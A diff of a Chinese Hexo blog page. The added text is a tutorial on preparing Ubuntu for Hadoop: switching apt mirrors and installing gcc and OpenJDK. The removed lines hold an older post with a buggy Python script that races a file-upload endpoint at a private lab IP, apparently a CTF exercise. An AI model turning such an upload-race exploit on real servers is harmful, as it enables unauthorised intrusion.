@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title> Jw5t</title>
+      <title>hadoop |  Jw5t</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="http://tva1.sinaimg.cn/large/007axxUTgy1gvl7m2su1sj60hs0hswg402.jpg" />
@@ -52,63 +52,9 @@
     
       
     <main class="content on">
-      
-<section class="cover">
-    
-  <div class="cover-frame">
-    <div class="bg-box">
-      <img src="/images/cover2.jpg" alt="image frame" />
-    </div>
-    <div class="cover-inner text-center text-white">
-      <h1><a href="/">Jw5t</a></h1>
-      <div id="subtitle-box">
-        
-        <span id="subtitle"></span>
-        
-      </div>
-      <div>
-        
-      </div>
-    </div>
-  </div>
-  <div class="cover-learn-more">
-    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
-  </div>
-</section>
-
-
-
-<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
-
-
-<!-- Subtitle -->
-
-  <script>
-    try {
-      var typed = new Typed("#subtitle", {
-        strings: ['富强、民主、文明、和谐', '自由、平等、公正、法治', '爱国、敬业、诚信、友善'],
-        startDelay: 0,
-        typeSpeed: 200,
-        loop: true,
-        backSpeed: 100,
-        showCursor: true
-      });
-    } catch (err) {
-      console.log(err)
-    }
-  </script>
-  
-<div id="main">
-  <section class="outer">
-  
-  
-  <article class="articles">
-    
-    
-    
-    
-    <article
-  id="post-条件竞争"
+      <section class="outer">
+  <article
+  id="post-hadoop安装从0到1一"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -118,128 +64,259 @@
     
     <header class="article-header">
        
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"
-    >条件竞争</a> 
-</h2>
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  hadoop
+</h1>
  
 
       
     </header>
      
     <div class="article-meta">
-      <a href="/2019/05/26/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" class="article-date">
+      <a href="/2019/05/26/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%B8%80/" class="article-date">
   <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%A4%87%E5%BF%98/">备忘</a>
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E6%A0%A1%E4%BD%9C%E4%B8%9A/">学校作业</a>
   </div>
-   
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">560</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">2 分钟</span>
+        </span>
+    </span>
+</div>
+ 
     </div>
       
+    <div class="tocbot"></div>
+
+
+
+
+  
     <div class="article-entry" itemprop="articleBody">
        
-  <p>import requests<br>import threading</p>
-<p>def scan():<br>    burp0_url = “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/upload.php&quot;">http://192.168.38.160:1007/upload.php&quot;</a><br>    burp0_url1 = “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/tmp/uploads/&quot;">http://192.168.38.160:1007/tmp/uploads/&quot;</a><br>    burp0_cookies = {“node”: “bWF4X2FsbG93ZWRfcGFja2V0”}<br>    burp0_headers = {“Pragma”: “no-cache”, “Cache-Control”: “no-cache”, “Upgrade-Insecure-Requests”: “1”,<br>                     “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36”,<br>                     “Origin”: “<a href="http://192.168.38.160:1007&quot;">http://192.168.38.160:1007&quot;</a>,<br>                     “Content-Type”: “multipart/form-data; boundary=—-WebKitFormBoundaryWoFwKBXGzbWzFApV”,<br>                     “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9”,<br>                     “Referer”: “<a target="_blank" rel="noopener" href="http://192.168.38.160:1007/&quot;">http://192.168.38.160:1007/&quot;</a>, “Accept-Encoding”: “gzip, deflate”,<br>                     “Accept-Language”: “zh-CN,zh;q=0.9”, “Connection”: “close”}<br>    burp0_data = “——WebKitFormBoundaryWoFwKBXGzbWzFApV\r\nContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;A.zip&quot;\r\nContent-Type: application/x-zip-compressed\r\n\r\nPK\x03\x04\x14\x00\x00\x00\x08\x00\xd4]mS\xedA\x00\xbb\xad\x06\x00\x00t\x12\x04\x00\x05\x00\x00\x00A.txt\xec\xd3\xc1\t\x84\x00\x10\x04\xc1\xbf<code>\x90\xe6\x9f\x84\x19\\?\x8eA\xc1\xaa\x08\x96f\xe7\xba\xf8\xe1&lt;\x9e\xbe\xe0\xe5\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\xe7!Q\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\xc5?\xfcO\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A \x981\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\x15\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81</code>\xc6\xbc\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xcc\x98W\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c^A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A \x981\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xe6\x15\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81<code>\xc6\xbc\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xcc\x98W\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\x82\x19\xf3\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c^A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10\x08f\xcc+\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\xc1\x8cy\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(|*\xd0\r\x00\x00\xff\xff\xec\xd3A\t\x00@\x10\xc40\xff\xaeOB\xe1</code>\x1e\x0b\x89\x84B\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x043\xf6\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@0c\xaf P\x10(\x08\x14\x04\n\x02\x85\xc3\x81\x1e\x00\x00\x00\xff\xff\xed\xd31\r\x000\x0c\xc0\xb0R\xf9\xd3\x1d\x84\\xedeC\x88\x94\x1b\x02\x05\x81\x82@A\xa0 P\x10(\x08\x14\x04\n\x02\x05\x81\x82@A\xa0 \x10\xac\xb1W\x98\xf7\x01PK\x01\x02\x14\x00\x14\x00\x00\x00\x08\x00\xd4]mS\xedA\x00\xbb\xad\x06\x00\x00t\x12\x04\x00\x05\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00A.txt\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xd8M\x03\x10A\xd8\xd7\x01O\xe5\xec\x13A\xd8\xd7\x01\x1b\x05?\xf2@\xd8\xd7\x01PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00W\x00\x00\x00\xd0\x06\x00\x00\x00\x00\r\n——WebKitFormBoundaryWoFwKBXGzbWzFApV–\r\n”</p>
-<pre><code>requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
-b1 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.zip&quot;, headers=burp0_headers, cookies=burp0_cookies).text
-b2 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.txt&quot;, headers=burp0_headers, cookies=burp0_cookies).text
-b3 = requests.get(burp0_url1 + &quot;/tmp/uploads/A.txt&quot;, headers=burp0_headers, cookies=burp0_cookies).text
-print(b1)
+  <h1 id="Hadoop安装从0到1【1-操作系统篇】"><a href="#Hadoop安装从0到1【1-操作系统篇】" class="headerlink" title="Hadoop安装从0到1【1.操作系统篇】"></a>Hadoop安装从0到1【1.操作系统篇】</h1><h2 id="虚拟机配置环节"><a href="#虚拟机配置环节" class="headerlink" title="虚拟机配置环节"></a>虚拟机配置环节</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p>首先下载ubuntu 的镜像iso文件，然后安装</p>
+<p>系统镜像下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://cn.ubuntu.com/download/desktop">https://cn.ubuntu.com/download/desktop</a></p>
+<p>此处安装太简单略过</p>
+<p>虚拟机安装完成后进入,是这个界面</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl269vhoij60lo0s3k8j02.jpg" alt="a.png"></p>
+<p>很多同学会遇到下载速度很慢的情况</p>
+<p>这个原因是因为你们的ubuntu是在访问国外的服务器 ，所以速度很慢</p>
+<p>这里需要换源</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
 
-if not b1.match(&#39;.*404 Not Found&#39;, b1.text):
-    print(b1.text)
-if not b2.match(&#39;.*404 Not Found&#39;, b2.text):
-    print(b2.text)
-if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
-    print(b3.text)
-</code></pre>
-<p>def upload():<br>    try:<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)<br>        threading.Thread(scan)</p>
-<pre><code>except:
-    # print(&quot;0&quot;)
-    pass
-</code></pre>
-<p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    while(True):<br>        upload()</p>
+<p>将下列数据复制，黏贴到第一行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+
+<p><strong>然后保存！！！！</strong></p>
+<p>再退出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cat /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+
+<p>看看上面的源是否黏贴进去了，没有就再试一次</p>
+<p><strong>接下来很重要</strong></p>
+<p>点左下角的菜单</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2d5kflbj60sg0uwtpy02.jpg" alt="GPH2987DC)RGVS_I$PJDT)Y.png"></p>
+<p>然后输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softwae</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2eh99yoj60sg0uwaqx02.jpg" alt="asdsaa.png"></p>
+<p>会出现这个，点击圈出来的这个</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2gdxsofj60sg0uwqmm02.jpg" alt="a.png"></p>
+<p>然后会有这个</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2hp0e25j60sg0uw1b502.jpg" alt="ddddddddd.png"></p>
+<p>然后将他改成中国的中科大源，或者其他源也可以，只要是国内就慢不到哪里去</p>
+<p>根据我多年经验</p>
+<p>清华源东西全，但是用的人太多，速度有时候会抽风</p>
+<p>豆瓣偶尔抽风</p>
+<p>阿里腾讯云还好 偶尔用</p>
+<p>中科大源东西全，用的人少，速度巨快，直接跑满带宽，中科大永远的神  yyds！！！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>
+
+
+
+<p>试试看，如果不是和电影里面黑客操作系统那样刷数字字符飞快的话（就是下载速度很快，没有1M也有几百kb每秒）就是没配置成功，再配一次</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc</span><br></pre></td></tr></table></figure>
+
+<p>下载个gcc 试试水</p>
+<p>几秒下好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2rmk7taj60js0cwk4a02.jpg" alt="QO@RL%7HFEP_$S%LSMA)I2F.png"></p>
+<p>有这样的图片就是成功了</p>
+<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>下载java </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2tk44qgj60k20de17302.jpg" alt="$HKSAKW73)6Q2`@`%DK}EB.png"></p>
+<p>5秒下好</p>
+<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2u4m8r4j60ip031wgo02.jpg" alt="ATN[~$]ZM{T~TFV3D41H(PX.png"></p>
+<p>至此，操作系统基本环境算是配置完成了</p>
  
       <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
       
     </div>
     
 
     <!-- copyright -->
     
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-换电脑重装事宜"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2018/05/26/%E6%8D%A2%E7%94%B5%E8%84%91%E9%87%8D%E8%A3%85%E4%BA%8B%E5%AE%9C/"
-    >MEADME</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2018/05/26/%E6%8D%A2%E7%94%B5%E8%84%91%E9%87%8D%E8%A3%85%E4%BA%8B%E5%AE%9C/" class="article-date">
-  <time datetime="2018-05-26T04:12:57.000Z" itemprop="datePublished">2018-05-26</time>
-</a>    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="MEADME"><a href="#MEADME" class="headerlink" title="MEADME"></a>MEADME</h1><p>换了电脑，之前博客莫得备份</p>
-<p>重新开始吧</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
     
     <footer class="article-footer">
        
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-  </article>
-  
-
-  
-  <nav class="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/page/2/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
-  </nav>
-  
-</section>
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
 </div>
 
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2019/05/26/hadoop%E5%AE%89%E8%A3%85%E4%BB%8E0%E5%88%B01%E4%B8%80/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2019/05/26/FlatScience/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            flatscience
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">python pip 换源</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
       <footer class="footer">
   <div class="outer">
     <ul>
@@ -383,6 +460,22 @@ if not b3.match(&#39;.*404 Not Found&#39;, b3.text):
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
 
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
 <link
